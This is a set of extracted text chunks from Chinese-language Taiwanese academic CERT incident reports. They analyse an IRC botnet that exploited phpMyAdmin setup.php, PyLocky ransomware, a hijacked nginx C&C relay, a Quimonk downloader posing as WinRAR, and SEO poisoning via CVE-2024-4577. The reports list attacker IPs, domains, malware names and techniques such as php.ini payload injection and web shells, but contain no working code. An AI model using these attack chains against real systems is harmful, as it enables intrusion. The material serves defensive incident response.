        "content": "159.34,而目前查詢到的已轉為位於美國的IP 位址 198.136.61.70,然而此IP 的反解析卻為dime192.dizinc.com。封 包內容只是單純固定存取該網頁資訊,可能作為報到用途。  6 2. 實地開啟「http://corepillar.com/」是一個Instagram APP 的相關 網站,提供使用者購買該APP 的Followers 和Likes 數目,類似在 Facebook 上的追蹤者和按讚數目,用來提高特定人物的名氣。 3. 另「freegeoip.net」紀錄上所解析出的IP 位址為加拿大的 168.235.149.225,而該IP 的反解析卻為「c1111150- 14489.cloudatcost.com」。然而目前該網域解析出的IP 已經變為歐 洲的141.101.118.58,封包內容為主機的位置資訊,可能為駭客用 來辨識感染主機位置所用。  7 4. 實地開啟「http://freegeoip.net」發現該網頁的port 80 確實有啟 用,但頁面無法正常開啟會出現HTTP 503 的訊息。 I. 檢查封包紀錄中有大量的IRC 協定連線,所有連線都是指向紐西蘭IP 位 址「89.248.172.240」的port 6667,此為IRC 登入的相關資訊,封包 中可看到登入ID、客戶端與伺服器端的PING PONG 回應及顯示同一IP 太多連線。 J. 檢查其中一支IRC 連線可以看到相關資訊,例如IRC server 上現有的 users、operators 數目等,可以藉此推斷約有29067 台主機成為殭屍電 腦連到同一IRC 主機。  8 III. 網路架構圖 Hacker 93.174.93.149 STEP 1 : 駭客透過網站漏洞 setup.php入侵植入惡意程式和網頁。 STEP 2 : Bot主機向FTP伺服器下在惡意程式 col4d.php。 STEP 3 : Bot主機透過col4d.php指令登入IRC伺服器等待命令。 STEP 4 : Bot主機持續向特定兩個網域名稱做HTTP GET報到。 STEP 5 : Bot",
        "Page_Num": "5,6,7,8"
    },
    "195": {
        "File_Name": "個案分析-N大學的異常IRC連線主機事件分析報告_10401.pdf",
        "content": "主機等待IRC命令向其他主機發動網路攻擊。 IRC Bot 163.X.X.43 Victims STEP 3 IRC Log in & wait command STEP 1 setup.php 漏洞存取 IRC Server 89.248.172.240 37.59.68.12 freegeoip.net & corepillar.com Control Server STEP 4 HTTP GET STEP 5 Attack Others STEP 2 FTP GET Col4d.php IV.建議與總結 A. 此事件主機主要是駭客對已知舊版appserv 的漏洞「phpmyadmin/ scripts/setup.php」植入執行惡意指令碼。 B. 透過指令碼主機會向37.59.68.12 進行FTP 下載惡意程式col4d.php。 C. 惡意程式col4d.php 內有IRC 伺服器的IP、埠和其他攻擊指令程式碼。  9 D. IRC Bot 透過col4d.php 登入IRC 伺服器並等待命令進行其他網路攻擊。 E. IRC Bot 也會持續地向網站「corepillar.com」和「freegeoip.net」進行 HTTP 的連線,作為主機存活的報到用途。 F. 安裝phpmyadmin 務必檢查是否有setup.php 漏洞存在並移除。 G. 注意主機是否有可疑的網路埠號被開啟並連線,且感染主機有可能產生 大量的異常流量壅塞網路頻寬。 H. 因為駭客只是利用該setup.php 漏洞去觸發網路行為,一旦漏洞被移除 後,異常的網路連線即恢復正常。 I. 雖然Bot 主機只是被利用來攻擊其他電腦,但也可能導致資料外洩,故 須格外注意小心。 ",
        "Page_Num": "8,9"
    },
    "196": {
        "File_Name": "個案分析-phpMyAdmin setup.php分析報告.pdf",
        "content": "個案分析- phpMyAdmin setup.php 分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2013/05  1 前言 PhpMyadmin[1]是一個以PHP 語言為基礎,讓使用者可以透過Web 介面管理後端Mqsql 資料庫的套件,它提供了許多管理功能,如資料庫匯入、匯出、刪除、修改等,讓使用 者在管理後端資料庫上省下許多時間。 PhpMyadmin 常與Apache、PHP、Mysql 這三個套件一起安裝,由於使用者需求,多年 前網路上流行著一個架站整合套件AppServ[2],AppServ 整合了PhpMyadmin、Apache、 PHP、Mysql,並且在安裝時自動幫使用者將Apache、PHP、Mysql 與PhpMyAdmin 四 個套件設定好,使用者僅需要輸入資料庫的帳號密碼便可,由於這樣的便利性,即使 AppServ 已經五年沒有更新(最後一次更新時間為2008-06-10),仍有許多大專院校學生 在架站時使用這個整合套件。 事件說明 2013 年3 月開始,D 大學資工系所使用的網段IP 一直收到四種不同的EWA 事件單:  udp_flood  udp_scan  udp_src_session  ip_dst_session 約有三十個IP 一直被重複開單,由於網段管理員查不出原因,而這些事件單幾乎每天 都有,一次多達五十張以上,因而引起該校資安聯絡人注意。這些被開單的IP 位於下 列這些網段:  xxx.208.2.0/24  xxx.208.3.0/24  xxx.208.6.0/25 被開單的主機皆裝有AppServ 2.5.10,安裝路徑使用預設,AppServ 預設路徑會安裝在C 槽底下,由於都使用預設安裝路徑,所以這些被開單的主機不約而同都有這個頁面 http://xxx.208.x.x/phpmyadmin/scripts/setup.php(如圖1),由Apache 的Log 可以看到, 14.139.56.12 這個IP 利用setup",
        "Page_Num": "1,2"
    },
    "197": {
        "File_Name": "個案分析-phpMyAdmin setup.php分析報告.pdf",
        "content": ".php 頁面成功POST 某些參數,(圖2 可以看到伺服器回 應碼200)。  2 而從主機的流量中則可以發現,14.139.56.12 利用這個方法,對xxx.208.2.217 注入了某 些code,使得主機會自動下載一個惡意的phpBot,並且使httpd.exe 執行之。由於是透 過httpd.exe 執行phpBot,當攻擊發生時,由主機的網路狀態看起來像是httpd.exe 這個 程式去攻擊別人。 圖1 預設安裝路徑下的setup.php 頁面 圖2 xxx.208.2.217 的Web Log 中,可以看到駭客經由setup.php 頁面成功POST 資料  3 事件發生流程  4 建議措施 1. 刪除C:\\AppServ\\www\\phpMyAdmin\\scripts\\setup.php (這是預設路徑,有的主機 setup.php 可能不在此路徑下) 2. 重新啟動主機(務必重新啟動主機以清空記憶體裡的攻擊程式) 3. 備份資料,重新安裝最新版的Apache、PHP、Mysql、PhpMyAdmin 由於學校資工系的學生慣用AppServ 架站,所以九成以上發出大量UDP 封包的主機都 來自該校的資工系網域,有些主機甚至為重要的網站及服務主機,難以在短時內備份, 並重新安裝Apache、PHP、Mysql、PhpMyAdmin。 由於這些主機發動UDP Flood 的惡意程式是透過setup.php 的漏洞注入主機,關機之後 惡意程式就會從記憶體裡面消失,所以只要電腦重開機,便看不出任何可疑的地方,等 到下次駭客需要進行攻擊,才會再利用setup.php 頁面,注入phpBot 到主機裡面進行攻 擊。 因此,管理員可以利用1)刪除setup.php 2)重新開機,兩個步驟,讓駭客不能注入惡意程 式到主機裡面,並且重開機將記憶體裡面的phpBot 揮發掉。由於不曉得駭客是否利用 setup.php 頁面在主機裡面設置了其他的惡意程式",
        "Page_Num": "2,3,4,5"
    },
    "198": {
        "File_Name": "個案分析-phpMyAdmin setup.php分析報告.pdf",
        "content": ",備份主機資料,重灌系統,並且安裝 最新版的Apache、PHP、Mysql、PhpMyAdmin 才是最好的解決之道。 參考 [1] http://www.phpmyadmin.net/home_page/index.php [2] http://www.appservnetwork.com/ ",
        "Page_Num": "5"
    },
    "199": {
        "File_Name": "個案分析-Pylocky勒索病毒攻擊事件分析報告_10710.pdf",
        "content": "個案分析- Pylocky 勒索病毒攻擊事件 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 107 年10 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 在2018 年7-8 月資安公司的安全研究人員發現名為PyLocky 的勒索病毒,該 病毒是用Python 語言編寫,與PyInstaller 一起打包,具有反機器學習能力, 而且還利用開源腳本的Inno Setup Installer。 2. 駭客透過大量垃圾郵件來散播PyLocky 勒索軟體,儘管它在勒索信中號稱是 Locky,但事實上PyLocky 與Locky 勒索病毒是無關的。 3. 為了解Pylocky 勒索病毒感染受害主機後之系統行為與網路行為,本中心取 得該病毒樣本後進行實機檢測。 II. 事件檢測 1. 首先,使用1 台安裝Windows 7 系統的VM 虛擬主機進行隔離環境測試,該 主機有設定連接一個網路磁碟機Z,而惡意程式樣本為Pylocky.exe,將它放 於受測主機上執行。 2. 檢視背景程式執行情形,發現當Pylocky.exe 執行後,會呼叫Pylocky.tmp, 之後會執行lockyfud.exe。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 檢視受害主機對外連線的情形,發現在Pylocky.exe 執行後並未對外連線其他 網外主機,可見此病毒主要針對受害主機進行勒索,無網路連線行為。 4. Pylocky.exe 執行完成後,會在桌面與使用者資料夾內新增一個 LOCKY-README.txt 的勒索通知信,該通知信內容以四種語言撰寫,分別為 英文、法文、義大利文與韓文,這表示該病毒可能針對懂這四種語言之一的 使用者發動攻擊。 在勒索通知信中,駭客告訴受害者使用Tor Browser 至網址 http://pylockyrkumqih51.onion/index.",
        "Page_Num": "1,2,3"
    },
    "200": {
        "File_Name": "個案分析-Pylocky勒索病毒攻擊事件分析報告_10710.pdf",
        "content": "php 去取得購買解密器來恢復被加密檔案 的方式,也提供受害者個人ID 與BIT KEY 資訊。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 檢視受害主機內檔案被加密的情形,發現使用者的文件資料夾、D 槽磁碟機 的資料夾與網路磁碟機Z 的資料夾內的檔案都被加密,但是在使用者的媒體  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 櫃之音樂、視訊與圖片等資料夾內檔案未被加密。該惡意程式在加密後會針 對每個被加密的檔案產生兩個副檔名為「.lockedfile」與「.lockymap」檔案。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 測試已被加密的檔案是否可以開啟,結果發現檔案類型為文字檔者其內容變 成勒索通知信的內容,而圖檔與其他檔案類型的檔案若被加密則無法開啟。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 檢視lockyfud.exe 所在之資料夾內容,發現is-897HP.tmp 的資料夾為Python 執行檔案的資料夾,推測Lockyfud.exe 使用Python 程式語言撰寫。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 程式Pylocky.exe 經VirusTotal 檢測,其惡意比例為42/68,比例不高,仍有許 多防毒軟體公司的防毒軟體無法檢測出它,該病毒被防毒軟體公司稱為 Pylocky 或locky,但是該病毒卻與locky 勒索病毒家族無關。 9. 程式lockyfud.exe 經VirusTotal 檢測,得知其惡意比例為37/68,比例低,可 見有許多防毒軟體公司的防毒軟體無法檢測出它。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team  10 臺灣學術網路危機處理中心(TACERT)",
        "Page_Num": "3,4,5,6,7,8,9,10,11"
    },
    "201": {
        "File_Name": "個案分析-Pylocky勒索病毒攻擊事件分析報告_10710.pdf",
        "content": "TANet Computer Emergency Response Team 10. 將LOCKY-README.txt 與受害主機內一個被加密圖檔上傳至ID Ransomware 勒索病毒辦別網站 (https://id-ransomware.malwarehunterteam.com),經檢測判定它為Pylocky 勒索 病毒,也得知該病毒目前沒有任何可解開被加密檔案的方式。 11. 安裝Tor Browser 軟體後連至駭客所提供的網址,在網頁上明確告訴受害者 該病毒名稱為Pylocky,下載解密器需受害者輸入勒索通知信內所提供的個人 ID,也告訴受害者需要在96 小時內支付贖金,否則贖金金額會加倍。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 在輸入受害者個人ID 並點選Download 後,出現識別受害者ID 的認證頁面, 要求受害者輸入BIT KEY 的內容。 13. 將BIT KEY 輸入並點選Download 後,出現告知如何支付贖金的頁面。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 在支付贖金的頁面中,詳細記載受害主機的電腦名稱、作業系統、CPU、RAM 與MAC 位置等資訊,也告訴受害者需要支付1,300 元美金來購買解密器。 點選Download 按鈕,出現提示受害者需先以比特幣支付贖金的視窗。 14. 查看支付贖金的內容,發現駭客準備18 種語言版本告訴受害者如何以比特 幣付款。  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 15. 在未付款的情況下,點選「Click Here if you have already sent Bitcoins」按鈕, 則出現尚未收到受害者支付贖金的提示語。 16. 檢視受害主機重新開機後程式執行情形,發現lokcyfud.exe 與 locky-readme.txt 在每次重新開機後會自動執行。 17. 將受害主機重新開機後,發現原本在加密完成後安裝的Tor Browser 軟體無 法開啟,原因為該軟體所用的部分檔案已被lokcyfud.exe 加密了,在重新安 裝該軟體後即解決此問題。  14",
        "Page_Num": "11,12,13,14,15"
    },
    "202": {
        "File_Name": "個案分析-Pylocky勒索病毒攻擊事件分析報告_10710.pdf",
        "content": "臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 檢視重新開機後開啟的LOCKY-README.txt 勒索通知信內容,發現受害者 個人ID 已被重設成一組新的ID,而BIT KEY 之內容也產生一組新的KEY。  15 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team III. 網路架構圖 1.駭客利用大量垃圾郵件的方式來散播Pylocky 病毒。 2.受害者開啟郵件,並且點擊郵件中包含Pylocky 的惡意網址。 3.受害者瀏覽惡意網頁後,主機感染Pylocky 病毒並執行它。 4.Pylocky 病毒執行後,透過PyInstaller 與Inno Setup Installer 產生 lockyfud.exe。 5.Lockyfud.exe 執行主機資料加密作業。 6.受害主機重新開機後,開啟重設User ID 與 BIT KEY 的勒索通知信,並 再次執行lockyfud.exe 的加密作業。 IV. 建議與總結 1. 本個案之Pylocky 病毒的攻擊行為與一般勒索病毒不同,在加密後會針對 每個被加密的檔案產生兩個副檔名為「.lockedfile」與「.lockymap」檔案。 2. 該病毒使用PyInstaller 與Inno Setup Installer 來產生加密用的惡意程式 lockyfud.exe,而且受害主機每次重新開機後會重新執行加密作業。 3. 目前針對Pylocky 勒索病毒沒有任何解密器,而且仍有許多防毒軟體公司 無法檢測出它,建議使用者定期備份重要資料,並且不隨意開啟不明來源 的信件或點選不明網址,以降低感染該病毒的風險。 ",
        "Page_Num": "15,16"
    },
    "203": {
        "File_Name": "個案分析-P大學的惡意程式中繼站事件分析報告_10309.pdf",
        "content": "個案分析- P 大學的惡意程式中繼站 事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2014/08  1 一、 事件簡介 1. 今年中接獲行政院技服中心通報,該P 大學有一台疑似C&C 或中繼站的 伺服器進行惡意行為。 2. 詢問該主機管理人員得知為某系所研究室的一台實驗用主機,IP 位址為 140.X.X.117,作業系統為Ubuntu Linux。 3. 預設有啟用SSH 服務,方便管理者遠端登入。 4. 該受感染主機會有大量使用網路頻寬的行為,比較可能是中繼站主機。 5. 本單位透過SSH 遠端登入協助檢測,並側錄惡意網路流量,找出惡意程 式並排除之。 二、 事件檢測 1. 系統檢測 A. 透過root 帳號登入後,首先使用netstat 指令可以看到網路埠號的 通訊狀態,開啟中的Port 有22、80 和443,明顯看出Port 80 和 443 為非管理者所啟用。 B. Port 80 和22 所執行的程序為nginx 服務,此為網頁伺服器Web Server 的服務軟體,功能如同常見的Apache 服務,只是較為簡便安 裝。 C. 再來我們使用指令top 可以看出目前系統CPU 使用率最高的程式也是 nginx,表示該主機主要是在運作web serivce。  2 D. 檢查「/usr/local/nginx/」 資料夾內的設定檔,發現到該主機成為 中繼站的證據。打開「nginx/conf/nginx.conf」 組態設定檔,可以 得知上層C&C 主機的IP 位址,以及中繼資料時會帶有資訊。 a. 由此可知Port 80 是開啟用來中繼資料至C&C 88.198.19.202 的 Port 80,並帶有HOST 網域名稱及 REMOTEADDR1 來源端IP 位址 給上層C&C 主機。 b. 另外Port 443 也被開啟用來接收底層Bots 的資料,中繼至上層 C&C 的Port 80,並帶有來源端位址和",
        "Page_Num": "1,2,3"
    },
    "204": {
        "File_Name": "個案分析-P大學的惡意程式中繼站事件分析報告_10309.pdf",
        "content": "中繼站網域名稱。駭客自 己簽屬私有的憑證並匯入,加密方式則使用SSLv3 和TLSv1 版 本,確保中繼的資料無法被外人解讀。 c. 駭客將web 的access log 和 error log 導至 /dev/null,也就 是所有的Log 資訊都被清除,故外人無法得知web 的連線紀錄。  3 d. 駭客設定crontab 會開機自動執行killall nginx,清除程式後 再重新啟動。 E. 我們發現該主機有個資料夾nginx/proxy_temp,內部資料都是空 的。研判中繼後的資料一旦傳輸完成就會被刪除,故找不到相關的留 存檔案。 2. 網路封包檢測 A. 從封包檔案可以得知,該中繼站主機使用Fast flux 的網域名稱切換 技術,也就是會有數個網域名稱對應至同一IP。網域名稱通常只維 持幾天就會消失,故會不斷切換至下一個可用網域名稱。 B. 目前記錄到的有四個名稱會對應至140.113.203.117,依次數多寡排 序為「ketbabbewiredis.su、carconsultingeg.su、 dororewhapton.net 和wtipubctwiekhir.net」。 C. 底層Bots 會透過SSL 加密方式將資料傳送給中繼站的Port 443,而 中繼站收到資料後會以HTTP POST 方式傳給上層C&C 主機。C&C 主機 透過收到封包中紀錄的REMOTEADDR1 IP 就能夠知道是哪個Bot 的資 料。 a. 首先底層Bot 會將加密文件用HTTPS 方式送至中繼站,從側錄封 包中可以發現其內文皆為密文。  4 b. 當中繼站收到bot 85.176.16.16 的加密資料,再POST sdgf.php 給上層C&C 88.198.19.202,且php 檔案內文也是經過加密,無 法得知內容。 c. 最後我們透過封包傳送的時序可以得知流程",
        "Page_Num": "3,4,5"
    },
    "205": {
        "File_Name": "個案分析-P大學的惡意程式中繼站事件分析報告_10309.pdf",
        "content": "為「85.176.16.16 140.X.X.11788.198.19.202」,也就是「BotRelayC&C」,其 中php 的封包中會標註 Remoteaddr1 (bot)的IP 讓C&C 知道。  5 D. 我們還觀察到底層Bot 主機透過中繼站會向上層C&C 主機 88.198.19.202 進行「HTTP GET /set/twe.exe」,也就是下載惡意程 式至Bot 進行安裝。 a. 該程式透過Virustotal 掃描的比例為43/53,為Crypt 類型的惡 意程式,可能會將感染主機資料進行加密的一種病毒。  6 E. 另外中繼站主機會不斷向上層C&C 主機進行 HTTP GET 圖片檔JPG 動 作,並且在封包中會帶有底層Bot 主機的IP,推測目的是為了確認 底層Bot 和C&C 主機之間通訊是否消失。偵測到C&C 提供的JPG 檔為 fhw.jpg 和wev.jpg 這兩種,皆為風景圖片。 圖、wev.jpg 圖、fhw.jpg F. 最後我們有側錄到一個可疑IP 透過SSH 連入該主機,該IP 位址是來 自韓國的112.216.92.44,可能是駭客破解SSH 帳號密碼後直接連 入,並植入中繼站的nginx 程式。  7 三、 網路架構圖 Internet Hacker STEP 1 : 電腦感染成為殭屍主機Zbots,並向中繼站透過HTTP或HTTPS方式傳送資料。 STEP 2 : 大量Zbots透過Fast Flux動態網域名稱解析連到中繼站主機群。 STEP 3 : C&C主機port 80接受來自中繼站140.X.X.117及其他中繼站的中繼資料。 STEP 4 : 駭客疑似透過SSH登入並控制中繼站主機。 STEP 5 : 駭客可能直接或間接向C&C主機存取偷竊來的資料。 STEP 1 HTTP & HTTPS C&C 主機 88.198.19.202:80 PC Zbots STEP 2 HTTP&HTTPS Rela",
        "Page_Num": "5,6,7,8"
    },
    "206": {
        "File_Name": "個案分析-P大學的惡意程式中繼站事件分析報告_10309.pdf",
        "content": "y Servers Fast Flux STEP 3 HTTP STEP 5 Access C&C STEP 4 SSH Login 四、 建議與總結 1. 此主機主要是因為SSH 遠端登入被駭客破解入侵,進而被植入  8 惡意程式成為中繼站主機。 2. 駭客會在主機內植入程式nginx,並設定proxy 以進行資料中 繼至特定IP。 3. 中繼的封包中會帶有動態的網域名稱以及底層BOT 的IP 位 址,供上層C&C 知道該資料的來源端位址。 4. 此中繼站會使用Fast Flux 技術變更網域名稱供底層BOT 連 入,目前記錄到的有四個網域名稱「ketbabbewiredis.su、 carconsultingeg.su、dororewhapton.net 和wtipubctwiekhir.net」。 5. 建議管理者帳號的密碼定期變更,且不使用常見的弱密碼。 6. 建議使用者限制SSH 來源端存取權限,例如限定特定網段或 IP 才能連入存取,避免被駭客破解入侵。 7. 中繼站主機通常帶有大量網路流量,容易造成頻寬壅塞而被察 覺,故當發現有異常網路流量時可能已遭受感染,應立即排 除。 ",
        "Page_Num": "8,9"
    },
    "207": {
        "File_Name": "個案分析-Quimonk木馬攻擊事件分析報告_10702.pdf",
        "content": "個案分析- Quimonk 木馬攻擊事件 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 107 年2 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 在學術網路中有許多木馬攻擊事件,其中因Quimonk 木馬程式(偵測規則 MALWARE-CNC Win.Trojan.Quimonk variant outbound connection detected )所觸發的資安事件在2017 年11 月至12 月期間開單量遽增,而且連續兩個 月位居N-ASOC 偵測規則第一名。 2. 從該類型資安事件的佐證資料得知,受害主機會以80port 連線至下列三個中 國IP: 123.57.151.113、120.76.122.200、120.26.109.229 之其中之一或二 個IP。 3. 為了瞭解該類型資安事件的觸發原因與攻擊行為,本中心取得樣本後進行檢 測。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team II. 事件檢測 1. 首先,將樣本sudajidnhf.exe 送至Virustotal 網站檢測,發現其為惡意之 比例有53/66,而且多家防毒公司稱它為QjMonkey、QIWMONK、Qjwmonkey 或 Downloader。 2. 在Win 7 系統上執行程式 sudajidnhf.exe,會出現安裝WinRAR 的安裝程式 畫面,WinRAR 為一般電腦常用免費軟體,容易降低使用者戒心,而點選程式 來進行安裝。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 執行完後出現下載成功訊息,同時桌面上出現名稱為wrar550scp 的應用程式 檔,可見此sudajidnhf.exe 主要功能為下載程式。 4. 點選視窗上「打開文件」選項,出現WinRAR 程式安裝畫面,點選「安裝」則 開始安裝該程式。 5. 在安裝WinRAR 同時檢視主機對外連線狀態,發現除了WinRAR 程式本身有對 外連線外,另外有產生許多不明程式的",
        "Page_Num": "1,2,3,4"
    },
    "208": {
        "File_Name": "個案分析-Quimonk木馬攻擊事件分析報告_10702.pdf",
        "content": "執行檔進行對外連線,因為在背景偷 偷執行程式,一般使用者無法發現此狀況。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 在安裝過程中,我們發現受測主機會連到兩個中國IP:123.57.151.113 與 120.76.122.200,而這兩個IP 與該類型資安事件的佐證資料目的IP 相同。 將兩個中國IP 送至Virustotal 檢測,發現這兩個IP 對應到網址 http://api.baizhu.cc,該網址被Virustotal 檢測為惡意的比例為3/66。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 檢視封包內容,發現受測主機連線至IP:123.57.151.113:80(對應主 機:api.baizhu.cc)並上傳資訊「&appid=1&sid=360&ver=2」到/api/getdown 資料夾,而主機回傳軟體下載路徑資訊給受測主機。 8. 檢視封包內容,發現受測主機連線至IP:120.76.122.200:80(對應主 機:api.baizhu.cc)並上傳資訊 「&type=7&appid=1&sid=360&ver=2&tg1=1&tg2=1&tg3=1&tg4=1&tg5=1&tg6= 1」到/api/open 資料夾。 9. 在WinRAR 安裝完成後,桌面出現我們未授權安裝的程式捷徑,如速壓與愛奇 藝的捷徑,也發現Internet Expleror 之內容被修改過。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 檢視桌面瀏覽器Internet Expleror 與Google Chrome 的內容,發現被植入 開啟瀏覽器後連到http://123.faioo.com 的語法。 (1)當開啟瀏覽器時一開始會連線至http://123.faioo.com,之後會轉址到 中國 360 導航的網站(https://hao.360.cn/?src=lm&ls=n20bcle3e9a)。  7 臺灣學術網路",
        "Page_Num": "4,5,6,7,8"
    },
    "209": {
        "File_Name": "個案分析-Quimonk木馬攻擊事件分析報告_10702.pdf",
        "content": "危機處理中心(TACERT) TANet Computer Emergency Response Team (2)將此兩個網址送至virustotal 檢測,發現其惡意比例為0/67。 11. 檢視背景程式運作情形,發現在執行sudajidnhf.exe 後,除安裝WinRar 外,該程式陸續下載安裝與執行一些程式(如下列所示),可見此程式 sudajidnhf.exe 為一個軟體下載器。 (1) 愛奇藝安裝程式IAIYIsetup_baizhu@kb001.exe (2) Inst13__3112087__3f7372633d6c6d266c733d6e31343463316364383939 __68616f2e3336302e636e__0c70.exe (3) 速壓安裝包KuaiZip_Setup_1970971572_liutc3_001.exe (4) 愛奇藝客戶端QyClient.exe (5) KZreport.exe (6) 檢查更新程式 Update.exe 與快壓檢查更新UpdateChecker.exe  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 檢視背景程式執行狀況時,發現在執行updatechecker.exe 時,會去更動 Chrome.exe 內容,開啟首頁時會連到大陸掏寶網站。 13. 用AutoRun 工具檢視系統開機情形,發現有兩個程式HCDNClient 與 QyClient 會在系統開機時自動執行,可見sudajidnhf.exe 除了下載軟體安 裝外,也會更改系統開機的設定。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 14. 當迷你新聞的程式在執行時,發現CPU 使用率將近100%,而且程式迷你新 聞與小貼士的執行檔送至Virustotal 檢測發現其惡意比例分別為24/66 與 21/68,可見sudajidnhf.exe 所下載安裝的軟體有惡意程式存在。 15. 在WinRAR 安裝完成後,發現該受測主機會在每隔一段時間後,不經使用者 允許,自行連線並下載安裝一些程式。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer",
        "Page_Num": "8,9,10,11"
    },
    "210": {
        "File_Name": "個案分析-Quimonk木馬攻擊事件分析報告_10702.pdf",
        "content": "Emergency Response Team III. 網路架構圖 1. 駭客將偽裝成WinRAR安裝程式的Quimonk木馬程式上傳至軟體下載網站 或透過社交工程方式散播。 2. 受害者透過APT 社交工程或軟體網站下載WinRAR 安裝程式。 3. 受害者執行WinRAR 安裝程式來安裝WinRAR 軟體。 4. 受害主機對外連線api.baizhu.cc 取得其他軟體下載安裝資訊。 5. WinRAR 程式安裝時自動安裝未經受害者授權安裝的惡意軟體於受害主 機內。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team IV. 建議與總結 1. 本個案類型資安事件之惡意程式會以下載器的形式,自行下載、安裝含有 惡意軟體的程式,並且更改系統開機與現有瀏覽器首頁的設定,也會不定 時執行更新與安裝新的軟體。 2. 本個案所安裝的軟體除了WinRAR 外,還有愛奇藝的客戶端軟體包與一些 小軟體,而有些軟體會讓CPU 資源衝到100%。 3. 經本中心檢測發現,若受害者透過使用防毒軟體掃描、惡意軟體清除程式 掃毒或將被安裝的軟體移除的方式來解決此問題,並無法將問題完全解 決,因為無法完全地將被修改或安裝的多個程式還原或移除。因此,建議 受害者將受害主機的資料備份後,重新安裝系統,這樣才能完全將該惡意 程式所安裝或更動的軟體完全移除。 ",
        "Page_Num": "11,12"
    },
    "211": {
        "File_Name": "個案分析-SEO中毒攻擊事件分析報告.pdf",
        "content": "0 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team TLP:WHITE SEO 中毒攻擊事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2024 年12 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、事件簡介 1. 2024/11 初使用Google 搜尋指令查詢「site:edu.tw “投資””當沖”」 或「site:edu.tw “鬥地主”」 ,在搜尋結果頁發現許多學校網站出現 大量不相關或不當連結的資訊。 2. 2024/11/7~2024/11/26 期間共有33 間學校受影響,其中18 間大學、4 間高中、3 間職業學校、 1 間國中、 5 間小學、2 個網路中心,而且 大部分學校使用XAMPP 架站。 3. 為了瞭解本事件發生的可能原因與攻擊行為,故對三間學校的網站主機 進行鑑識。 二、 SEO 中毒攻擊與CVE-2024-4577 漏洞 1. SEO 中毒攻擊是指利用google Search 的搜尋演算法特性,使用黑帽SEO 技術,讓攻擊者自我設計的惡意網站於Google 上排名升高,導致使用 者可能信任並訪問惡意網站。 2. CVE-2024-4577 漏洞是因PHP 忽略Windows 作業系統內部對字元編碼 轉換的最佳化對應,導致未認證的攻擊者可透過特定的字元序列繞過舊 有的保護;並透過參數注入等攻擊在遠端 PHP 伺服器上執行任意程式 碼。導致漏洞觸發有兩種可能情形:(1)將PHP 設置於CGI 模式下執行(2)  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 將PHP 執行檔曝露於CGI 資料夾,即使未透過CGI 模式執行PHP,也 會曝露相關風險。由於安裝 Windows 版XAMPP 的預設設定,就符合 這個漏洞的組態。因此使用這種套件的Windows 主機,也可能受影響。 尤其當Windows 作業系統執行於繁體中文、簡體中文與日文等語系時, 攻擊者可直接在遠",
        "Page_Num": "1,2,3"
    },
    "212": {
        "File_Name": "個案分析-SEO中毒攻擊事件分析報告.pdf",
        "content": "端伺服器上執行任意程式碼。 三、 事件檢測-案例A 高中SEO 中毒攻擊事件 1. 受害網站使用XAMPP3.2 架站,可能具有CVE-2024-4577 漏洞。 2. 在網站目錄(\\htdocs)下的img 資料夾內有大量亂碼的gz 壓縮檔,解壓縮 開啟後,可看到內容中有Google 搜尋到的不當文字,例如:與股票、遊 戲或手機有關的關鍵字。 3. 在網站主機內發現php.ini 被修改後,開啟「allow_url_include=on」的 功能,以及使用「auto_prepend_file=base64 payload」來下載惡意程式 碼。 4. 在網站主機內發現下表所列惡意檔案,而由這些可疑PHP 檔的修改日 期可推測出駭客可能入侵日期。 檔案名稱 修改日期 說明(Virustotal) winsys.exe 2024/10/16 下午03:26 挖礦程式(63/73) nssm.exe 2024/10/16 下午03:26 Windows 服務管理的駭客工具(3/72) 。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 檔案名稱 修改日期 說明(Virustotal) Goto.php 2024/10/06 上午02:11 為可執行CMD 指令的web shell,使用它可 下載GotoHTTP.exe。(33/73) Abuaaa.php 2024/09/27 上午06:39 將一段由gzip 壓縮的PHP 程式碼解壓縮並用 eval 執行。它會檢查使用者是否來自搜索引 擎的爬蟲。 Gama.php 2024/10/27 下午04:36 根據使用者是否是搜索引擎的爬蟲,以及當 前 URL 是否符合特定的檔案之副檔名來決 定是否將使用者重新導向或發送 HTTP 請 求到指定的URL。 SyJpP47.php 2024/10/12 下午05:54 它會將經過編碼的 Payload 傳遞給 eval() 函數執行。 5. IP: 81.161.238.6 從2024/10/25 上午03:12~2024/11/12 上午9:16 陸續對網 